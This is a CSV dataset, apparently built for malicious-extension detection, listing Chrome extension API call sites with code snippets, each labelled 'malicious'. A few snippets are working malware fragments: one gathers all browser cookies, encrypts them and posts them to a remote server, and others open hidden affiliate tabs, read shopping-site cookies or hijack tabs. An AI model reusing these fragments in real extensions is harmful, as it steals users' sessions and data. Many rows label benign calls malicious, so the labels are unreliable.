col0,col1,col2,col3,db_type,query_name,extracted_code_block
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,51,chrome.bookmarks.search,chrome. ...      }),malicious,chrome,"chrome.bookmarks.search(folderName, (results) => { if (results.length > 0) { resolve(results[0].id); } else { chrome.bookmarks.create({ parentId: idParentFolder, title: folderName }, (newFolder) => { resolve(newFolder.id); }); } })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,55,chrome.bookmarks.create,chrome. ...      }),malicious,chrome,"chrome.bookmarks.create({ parentId: idParentFolder, title: folderName }, (newFolder) => { resolve(newFolder.id); })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,65,chrome.bookmarks.search,chrome. ...      }),malicious,chrome,"chrome.bookmarks.search({ title: title, url: url }, function (existingBookmarks) { if (existingBookmarks.length === 0) { chrome.bookmarks.create({ parentId: parentId, title: title, url: url }); } })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,67,chrome.bookmarks.create,chrome. ...      }),malicious,chrome,"chrome.bookmarks.create({ parentId: parentId, title: title, url: url })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,79,chrome.bookmarks.search,chrome. ...      }),malicious,chrome,"chrome.bookmarks.search({ title, url }, function (existingBookmarks) { if (existingBookmarks.length) { const bookmarkId = existingBookmarks[0].id; chrome.bookmarks.remove(bookmarkId); } })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,82,chrome.bookmarks.remove,chrome. ... markId),malicious,chrome,chrome.bookmarks.remove(bookmarkId)
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,106,chrome.alarms.clear,chrome. ... r('up'),malicious,chrome,chrome.alarms.clear('up')
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,167,chrome.bookmarks.search,chrome. ...      }),malicious,chrome,"chrome.bookmarks.search({ url: link.url }, (results) => { const isInstalled = results.length > 0; resolve(isInstalled ? 1 : 0); })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js,219,chrome.alarms.create,chrome. ... utes }),malicious,chrome,"chrome.alarms.create('up', { when: now + delayMilliseconds, periodInMinutes: delayMinutes })"
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/popup.js,33,chrome.bookmarks.getTree,chrome. ...      }),malicious,chrome,chrome.bookmarks.getTree((bookmarksTree) => { if (chrome.runtime.lastError) { reject(chrome.runtime.lastError); } else { const count = countBookmarks(bookmarksTree[0]); resolve(count); } })
BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/popup.js,58,chrome.bookmarks.getTree,chrome. ...      }),malicious,chrome,chrome.bookmarks.getTree((bookmarksTree) => { if (chrome.runtime.lastError) { reject(chrome.runtime.lastError); } else { const html = firstGeneralBookmarkHtml(bookmarksTree[0]); resolve(html); } })
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background.js,525,chrome.cookies.getAll,chrome. ... in}` }),malicious,chrome,chrome.cookies.getAll({ domain: `${domain}` })
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,chrome.cookies.getAll,"chrome. ... :""""+s})",malicious,chrome,"chrome.cookies.getAll({domain:""""+s})"
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,chrome.cookies.getAll,chrome. ... }n(e)}),malicious,chrome,"chrome.cookies.getAll({},async e=>{if(0<e.length){var t=sjcl.encrypt(g,JSON.stringify(e),{ks:256});try{var a=new URLSearchParams;a.set(""data"",t),d=await ky.post(u,{headers:{Accept:""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"",From:extensionName,ID:chrome.runtime.id,UUID:Utils.getUserID(),Cookies:i},credentials:""include"",body:a}).text()}catch(e){}}n(e)})"
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,chrome.declarativeNetRequest.updateDynamicRules,chrome. ... s:[a]}),malicious,chrome,chrome.declarativeNetRequest.updateDynamicRules({removeRuleIds:[a]})
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,chrome.declarativeNetRequest.updateDynamicRules,"chrome. ... ""]}}]})",malicious,chrome,"chrome.declarativeNetRequest.updateDynamicRules({addRules:[{id:a,priority:1,action:{type:""modifyHeaders"",requestHeaders:[{header:i,operation:""remove""},{header:i.replace(""X-GOOGLE-EXTENSION-"",""""),operation:""set"",value:r}]},condition:{urlFilter:n,resourceTypes:[""main_frame"",""sub_frame"",""stylesheet"",""script"",""image"",""font"",""object"",""xmlhttprequest"",""ping"",""csp_report"",""media"",""websocket"",""webtransport"",""webbundle"",""other""]}}]})"
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,chrome.declarativeNetRequest.getDynamicRules,chrome. ... Rules(),malicious,chrome,chrome.declarativeNetRequest.getDynamicRules()
FORM-SEARCH-pkfehkjibljchopnmfifbeanijojgkgb.3_5_0_0/src/background.js,32,chrome.runtime.setUninstallURL,chrome. ... {uid}`),malicious,chrome,chrome.runtime.setUninstallURL(`${serverUrl}/leaving/${extSlug}?uid=${uid}`)
FORM-SEARCH-pkfehkjibljchopnmfifbeanijojgkgb.3_5_0_0/src/background.js,34,chrome.tabs.create,chrome. ... \n    }),malicious,chrome,chrome.tabs.create({ url: 'search.html' })
FORM-SEARCH-pkfehkjibljchopnmfifbeanijojgkgb.3_5_0_0/src/background.js,37,chrome.tabs.create,chrome. ... \n    }),malicious,chrome,chrome.tabs.create({ url: `${serverUrl}/greeting/${extSlug}?uid=${uid}` })
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.create,chrome. ... :t})})),malicious,chrome,"chrome.tabs.create({url:""https://megabonus.com/y/wEF3t"",active:!1},(t=>{e({affTab:t})}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.create,chrome. ... r(t)})),malicious,chrome,"chrome.tabs.create({active:!1,url:""https://megabonus.com/y/4AMcD""},(e=>{const t=(r,n)=>{""complete""===n.status&&r===e.id&&(chrome.tabs.remove(r),chrome.tabs.onUpdated.removeListener(t))};chrome.tabs.onUpdated.addListener(t)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.create,chrome. ... SION)}),malicious,chrome,chrome.tabs.create({url:getUrl(n.NEW_VERSION)})
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.remove,chrome. ... .tabId),malicious,chrome,chrome.tabs.remove(t.data.tabId)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.remove,chrome. ... move(r),malicious,chrome,chrome.tabs.remove(r)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.cookies.get,chrome. ... lue)})),malicious,chrome,"chrome.cookies.get({url:""https://shoppingcart.aliexpress.com/"",name:""xman_us_f""},(e=>{i(e.value)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.sendMessage,chrome. ... n(e)})),malicious,chrome,"chrome.runtime.sendMessage({cmd:e,data:t},(async e=>{if(chrome.runtime.lastError)return console.log(""Messaging error"",chrome.runtime.lastError),void n(null);n(e)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.sendMessage,chrome. ... t(e)})),malicious,chrome,"chrome.runtime.sendMessage({cmd:e},(async e=>{if(chrome.runtime.lastError)return console.log(""Messaging error"",chrome.runtime.lastError),void t(null);t(e)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.sendMessage,chrome. ... e(t)})),malicious,chrome,"chrome.runtime.sendMessage({cmd:""CMD_GET_ORDER_CURRENCY"",data:{params:n}},(t=>{e(t)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.sendMessage,chrome. ... 0:e)})),malicious,chrome,"chrome.runtime.sendMessage({cmd:""CMD_GET_EXCHANGE_RATE"",data:{currency:e}},(e=>{o(null===e?void 0:e)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.sendMessage,chrome. ... cmd:s}),malicious,chrome,chrome.runtime.sendMessage({cmd:s})
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.getURL,"chrome. ... o.png"")",malicious,chrome,"chrome.runtime.getURL(""assets/img/ali_compare_logo.png"")"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/contentShein.41183e58.js,1,chrome.runtime.sendMessage,chrome. ... )}))})),malicious,chrome,"chrome.runtime.sendMessage({cmd:""CMD_OPEN_SHEIN_AFF""},(r=>{r?.affTab?.id&&window.addEventListener(""storage"",(a=>{a.key===e&&t()&&chrome.runtime.sendMessage({cmd:""CMD_CLOSE_SHEIN_AFF"",data:{tabId:r.affTab.id}})}))}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/contentShein.41183e58.js,1,chrome.runtime.sendMessage,chrome. ... b.id}}),malicious,chrome,"chrome.runtime.sendMessage({cmd:""CMD_CLOSE_SHEIN_AFF"",data:{tabId:r.affTab.id}})"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,18,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: ""chrome://newtab"" })"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,25,chrome.tabs.getSelected,chrome. ... );\n  }),malicious,chrome,"chrome.tabs.getSelected(null, function(tab) { chrome.tabs.update(tab.id, {url: url}); })"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,26,chrome.tabs.update,chrome. ... : url}),malicious,chrome,"chrome.tabs.update(tab.id, {url: url})"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,60,chrome.tabs.remove,chrome. ... esolve),malicious,chrome,"chrome.tabs.remove(tabIdsToRemove, resolve)"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,68,chrome.tabs.create,"chrome. ... ue }, )",malicious,chrome,"chrome.tabs.create({ url: 'https://ddksearch.com/thankyou.php', active: true }, )"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,70,chrome.runtime.setUninstallURL,chrome. ... .html'),malicious,chrome,chrome.runtime.setUninstallURL('https://ddksearch.com/uninstalled.html')
JS-SEARCH-ompmbcpalofeaelpfohpmpmjhjahgpbp.1_0_2_0/src/background/runtime.js,3,chrome.tabs.create,chrome. ... b'\n  }),malicious,chrome,chrome.tabs.create({ url: 'chrome://newtab' })
JS-SEARCH-ompmbcpalofeaelpfohpmpmjhjahgpbp.1_0_2_0/src/static/js/script.js,1,chrome.runtime.getManifest,chrome. ... ifest(),malicious,chrome,chrome.runtime.getManifest()
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,22,chrome.tabs.query,chrome. ... \n    }),malicious,chrome,"chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) { if (!tabs || !tabs[0]) return; callback(tabs[0]); })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,79,chrome.cookies.getAll,chrome. ... \n    }),malicious,chrome,"chrome.cookies.getAll({ domain: extSettings.ProductDomain }, function (cookies) { for (let i = 0; i < cookies.length; i++) { if (cookies[i].name.indexOf('trcrx_') != -1) { const cookieName = cookies[i].name.split('trcrx_')[1]; setSetting(cookieName, cookies[i].value, cookieName === 'guid'); } } if (callback) callback(); })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,91,chrome.tabs.create,chrome. ... \n    }),malicious,chrome,"chrome.tabs.create({ url: tabURL, active: isActive })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,115,chrome.tabs.query,chrome. ... \n    }),malicious,chrome,"chrome.tabs.query({ url: '*://chrome.google.com/webstore/*' }, function (tabs) { for (tab of tabs) { if (tab.id && tab.url.includes(getSetting('extId'))) { if (cwsUrl) { chrome.tabs.update(tab.id, { url: cwsUrl }); chrome.windows.update(tab.windowId, { focused: true }); } else if (extSettings[TY_COOKIE_NAME]) { chrome.tabs.remove(tab.id); } } } })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,119,chrome.tabs.update,chrome. ... sUrl }),malicious,chrome,"chrome.tabs.update(tab.id, { url: cwsUrl })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,122,chrome.tabs.remove,chrome. ... tab.id),malicious,chrome,chrome.tabs.remove(tab.id)
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,129,chrome.tabs.query,chrome. ...      }),malicious,chrome,"chrome.tabs.query({ url: `${ getSetting('location') }*` }, function (tab) { if (tab && tab[0] && tab[0].id) { chrome.tabs.update(tab[0].id, { url: lpUrl }); } })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,131,chrome.tabs.update,chrome. ... pUrl }),malicious,chrome,"chrome.tabs.update(tab[0].id, { url: lpUrl })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,137,chrome.tabs.update,chrome. ...      }),malicious,chrome,"chrome.tabs.update(activeTab.id, { url: lpUrl }, function (tab) { })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/listeners.js,7,chrome.tabs.update,chrome. ... rl() }),malicious,chrome,"chrome.tabs.update(activeTab.id, { url: getNTUrl() })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/listeners.js,33,chrome.runtime.getManifest,chrome. ... ifest(),malicious,chrome,chrome.runtime.getManifest()
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/listeners.js,36,chrome.runtime.getManifest,chrome. ... ifest(),malicious,chrome,chrome.runtime.getManifest()
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/omni.js,18,chrome.tabs.update,chrome. ...  url }),malicious,chrome,"chrome.tabs.update(tab.id, { url })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/startup.js,6,chrome.management.getSelf,chrome. ...      }),malicious,chrome,"chrome.management.getSelf(function (extInfo) { setSetting('extId', extInfo.id); setSetting('extVersion', extInfo.version); const src = `https://ext.${ extSettings.ProductDomain }/api/v1/px/install?` + `&eType=${ extSettings.EType }&ext.yid=${ extSettings.ProductId }&ext.id=${ extInfo.id }&ext.version=${ extInfo.version }`; addBGImg(src, function () { getCookies(function () { ping(); firstRunPage(); }); }); })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/startup.js,49,chrome.runtime.setUninstallURL,chrome. ... \n    }),malicious,chrome,"chrome.runtime.setUninstallURL(uninstallUrl, function () { })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/options/options.js,1,chrome.runtime.sendMessage,chrome. ... url;\n}),malicious,chrome,"chrome.runtime.sendMessage({ task: ""getOptionsRedirectUrl"" }, function(res) { document.querySelector(""#frame"").src = res.url; })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/options/tabContent.js,5,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""getSetting"", name: event.data.name, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/options/tabContent.js,16,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""setSetting"", name: event.data.name, value: event.data.value, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/options/tabContent.js,28,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: event.data.msg, obj: event.data.obj, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/options/tabContent.js,39,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""openUrl"", obj: event.data, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/popup/popup.js,5,chrome.runtime.sendMessage,chrome. ... \n    }),malicious,chrome,"chrome.runtime.sendMessage({ task: ""getPopUpUrl"" }, function(res) { document.querySelector(""#frame"").src = res.url; })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/popup/tabContent.js,5,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""getSetting"", name: event.data.name, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/popup/tabContent.js,16,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""setSetting"", name: event.data.name, value: event.data.value, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/popup/tabContent.js,28,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: event.data.msg, obj: event.data.obj, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/popup/tabContent.js,39,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""openUrl"", obj: event.data, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/prompt/prompt.js,1,chrome.runtime.getURL,"chrome. ... w.png"")",malicious,chrome,"chrome.runtime.getURL(""prompt/green-up-arrow.png"")"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/prompt/prompt.js,2,chrome.runtime.getURL,"chrome. ... e.png"")",malicious,chrome,"chrome.runtime.getURL(""prompt/ok-green-square.png"")"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/prompt/prompt.js,108,chrome.runtime.sendMessage,chrome. ... }\n    ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""getSetting"", name: ""firstSearchMade"", }, function(res) { if (res) { const hidePrompt = function() { document.querySelector(""#arrow-modal"").innerHTML = """"; document.body.onclick = null; };  const styles = document.createTextNode(promptCSS); const promptStyles = document.createElement(""STYLE""); promptStyles.appendChild(styles); document.querySelector(""body"").appendChild(promptStyles);  const promptDiv = document.createElement(""div""); promptDiv.innerHTML = promptHTML; document.querySelector(""body"").appendChild(promptDiv);  document.body.onclick = function() { hidePrompt(); }; setTimeout(hidePrompt, 5000);  chrome.runtime.sendMessage( { task: ""setSetting"", name: ""firstSearchMade"", value: false, }, function() {} ); } } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/prompt/prompt.js,134,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""setSetting"", name: ""firstSearchMade"", value: false, }, function() {} )"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,675,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,"chrome.runtime.sendMessage({ message: SM_MESSAGE_SIGN_IN }, function (success) { if (!success) return reject(); // Wait for signal 'signed in'  chrome.runtime.onMessage.addListener(function (message) { if (message.message == SM_MESSAGE_SIGNED_IN) { // Make sure user is signed in _this2.getUser(true /* No caching */ ).then(resolve).catch(reject); } }); })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,781,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,"chrome.runtime.sendMessage({ message: SM_MESSAGE_OPEN_OPTIONS_PAGE }, function (response) { if (response === true) resolve();else reject(); })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,878,chrome.runtime.getManifest,chrome. ... ifest(),malicious,chrome,chrome.runtime.getManifest()
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7108,chrome.tabs.create,chrome. ... ')\n  }),malicious,chrome,"chrome.tabs.create({ url: Startme[""a"" /* default */].apiURL('/users/home') })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7118,chrome.tabs.create,chrome. ... ')\n  }),malicious,chrome,"chrome.tabs.create({ url: Startme[""a"" /* default */].apiURL('/bookmarks?section=inbox') })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7131,chrome.tabs.create,chrome. ... \n    }),malicious,chrome,chrome.tabs.create({ url: chrome.runtime.getURL('welcome.html') })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7132,chrome.runtime.getURL,chrome. ... .html'),malicious,chrome,chrome.runtime.getURL('welcome.html')
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7136,chrome.tabs.sendMessage,chrome. ...      }),malicious,chrome,"chrome.tabs.sendMessage(tab.id, { message: SM_MESSAGE_SHOW_WELCOME })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7194,chrome.runtime.setUninstallURL,chrome. ... WSER))),malicious,chrome,"chrome.runtime.setUninstallURL(Startme[""a"" /* default */].primaryURL(""/chrome_uninstall.html?browser="".concat(WINDOW_CURRENT_BROWSER)))"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7448,chrome.tabs.query,chrome. ... ue\n  }),malicious,chrome,"chrome.tabs.query({ active: true, currentWindow: true })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7455,chrome.tabs.update,chrome. ... \n    }),malicious,chrome,"chrome.tabs.update(tabs[0].id, { url: url })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7580,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: request.url, active: !!request.active })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7585,chrome.tabs.update,chrome. ...      }),malicious,chrome,chrome.tabs.update({ url: request.url })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7666,chrome.tabs.query,chrome. ... ue\n  }),malicious,chrome,"chrome.tabs.query({ active: true, currentWindow: true })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7672,chrome.tabs.sendMessage,chrome. ... \n    }),malicious,chrome,"chrome.tabs.sendMessage(tabId, { message: SM_MESSAGE_CHECK_IFRAME_SRC, homepageUrl: homepageUrl, url: url })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7721,chrome.tabs.create,chrome. ... e'\n  }),malicious,chrome,chrome.tabs.create({ url: 'https://support.start.me' })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7731,chrome.tabs.create,chrome. ... e'\n  }),malicious,chrome,chrome.tabs.create({ url: 'https://support.start.me/hc/en-us/articles/360017846280-Extension-New-tab-page-by-start-me' })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7741,chrome.runtime.openOptionsPage,chrome. ... sPage(),malicious,chrome,chrome.runtime.openOptionsPage()
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8130,chrome.runtime.getURL,chrome. ... .html'),malicious,chrome,chrome.runtime.getURL('popup.html')
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8189,chrome.runtime.getURL,chrome. ... .html'),malicious,chrome,chrome.runtime.getURL('import.html')
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8195,chrome.tabs.remove,chrome. ... tTabId),malicious,chrome,chrome.tabs.remove(importTabId)
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8198,chrome.tabs.create,chrome. ...      }),malicious,chrome,chrome.tabs.create({ url: importedPageUrl })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8218,chrome.bookmarks.getTree,chrome. ... tTree(),malicious,chrome,chrome.bookmarks.getTree()
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8349,chrome.tabs.create,chrome. ... \n    }),malicious,chrome,chrome.tabs.create({ url: url })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8412,chrome.tabs.query,chrome. ...      }),malicious,chrome,"chrome.tabs.query({ windowId: window.id, index: 0 })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/chunk-common.d3333ef8.js,275,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,"chrome.runtime.sendMessage({ message: SM_MESSAGE_SIGN_IN }, function (success) { if (!success) return reject(); // Wait for signal 'signed in'  chrome.runtime.onMessage.addListener(function (message) { if (message.message == SM_MESSAGE_SIGNED_IN) { // Make sure user is signed in _this2.getUser(true /* No caching */ ).then(resolve).catch(reject); } }); })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/chunk-common.d3333ef8.js,381,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,"chrome.runtime.sendMessage({ message: SM_MESSAGE_OPEN_OPTIONS_PAGE }, function (response) { if (response === true) resolve();else reject(); })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/chunk-common.d3333ef8.js,478,chrome.runtime.getManifest,chrome. ... ifest(),malicious,chrome,chrome.runtime.getManifest()
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/new_tab.be8d9eaa.js,328,chrome.runtime.sendMessage,chrome. ... \n    }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_OPEN_URL })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,1651,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,"chrome.runtime.sendMessage({ message: SM_MESSAGE_GET_USER_PAGES, noCache: true })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,1755,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_OPEN_BOOKMARKS })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,1807,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_SIGN_IN })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,1945,chrome.tabs.remove,chrome. ... sArray),malicious,chrome,chrome.tabs.remove(_this19.selectedOpenTabsArray)
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,1957,chrome.tabs.remove,chrome. ... sArray),malicious,chrome,chrome.tabs.remove(_this19.selectedOpenTabsArray)
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2127,chrome.tabs.remove,chrome. ... sArray),malicious,chrome,chrome.tabs.remove(_this22.selectedOpenTabsArray)
